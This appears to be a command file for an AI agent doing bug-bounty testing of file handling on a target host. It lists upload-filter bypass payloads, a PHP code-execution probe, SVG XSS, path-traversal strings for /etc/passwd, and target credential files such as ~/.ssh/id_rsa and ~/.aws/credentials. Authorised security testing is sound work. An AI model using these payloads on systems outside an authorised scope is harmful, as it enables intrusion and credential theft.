---
description: Hunt file handling — upload bypass to code execution, path traversal, arbitrary write, storage ACLs.
argument-hint: <host> [upload-endpoint]
allowed-tools: Bash, Read, Write, WebFetch
---

# /files

`references/10`, `checklists/file-upload.md`.

**Input:** `$ARGUMENTS` — host, optionally the upload or download endpoint.

```
/files https://app.acme.com
/files "POST /api/avatar"
```

Prove with the smallest possible payload. Never leave a working shell behind.

---

## Step 1 — Upload checklist

Test each row independently; one failure can be Critical.

- [ ] **Extension allowlist:** `.php .phtml .php5 .pht .jsp .jspx .asp .aspx
      .svg .html .htm .js .htaccess .config .shtml .cgi .pl`
- [ ] **Content-Type confusion:** send `image/png` with a PHP body
- [ ] **Magic bytes:** `GIF89a;<?php ...` passes image checks on some stacks
- [ ] **Double extension:** `shell.php.jpg`, `shell.jpg.php`, `shell.pHp`
- [ ] **Trailing characters:** `shell.php%00.jpg`, `shell.php.`, `shell.php `,
      `shell.php::$DATA`
- [ ] **Filename traversal:** `../../var/www/shell.php` as the name
- [ ] **SVG:** `<svg onload=alert(1)>` served same-origin = stored XSS
- [ ] **HTML:** an `.html` served from the app origin = XSS/phishing on their domain
- [ ] **Zip:** entry names with `../` (zip-slip), symlinks inside
- [ ] **Where it lands:** same origin? CDN? public bucket?
- [ ] **Is the upload dir executed?** `/uploads/x.php` reachable and executed?

Prove code execution minimally:

```php
<?php echo "BTEST".(7*7); ?>
```

`BTEST49` in the response = RCE. Delete the file, or tell the program exactly
where it is.

## Step 2 — Path traversal and file read

```
/download?file=../../../../etc/passwd
/download?file=..%2f..%2f..%2fetc%2fpasswd
/download?file=....//....//etc/passwd
/download?file=..%252f..%252fetc%252fpasswd
/download?file=/etc/passwd
/download?file=file:///etc/passwd
```

Windows:

```
..\..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
C:\windows\win.ini
```

Confirm with content you recognise: `root:x:0:0` or `[extensions]`. An empty 200
is not proof.

Then, and only then, one high-value file: `.env`, `config.php`, `web.config`,
`~/.ssh/id_rsa`, `~/.aws/credentials`, `/proc/self/environ`. Read one, capture the
first line, stop.

## Step 3 — Arbitrary write / delete

Where: rename, move, "save as", backup restore, avatar path, export path.

- Write a marker file you control: `bbtest-<rand>.txt`.
- Overwrite only on a path you created.
- Symlink upload to a file you own, then download it.
- Never delete or overwrite anything a real user owns.

## Step 4 — Storage misconfiguration

```bash
curl -s "https://BUCKET.s3.amazonaws.com/?list-type=2"
curl -s "https://BUCKET.s3.amazonaws.com/?acl"
curl -s "https://storage.googleapis.com/BUCKET/"
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

Before reporting: prove the data is **theirs** (their domain in object metadata,
their brand, their customer emails) and **sensitive** (not marketing images).
A public bucket of product photos is by design.

## Step 5 — Export and report generators

- IDOR on the export id, or on the produced file path (`/exports/1042.csv`)
- SSRF if the export pulls from a URL
- Template injection if a template is rendered into the file
- CSV formula injection — usually excluded, note only

---

## Output shape

```
upload tests: N   code exec: yes/no
file read: yes/no — <file>
storage: closed | public — <what is inside>
evidence: findings/<slug>/
severity: <band>
next: /score then /report
```

## Stop conditions

- Any upload that executes → capture the echo output, delete the file, report now.
- Real customer files listed → one key name, redacted, stop.
- Never run a reverse shell against production.
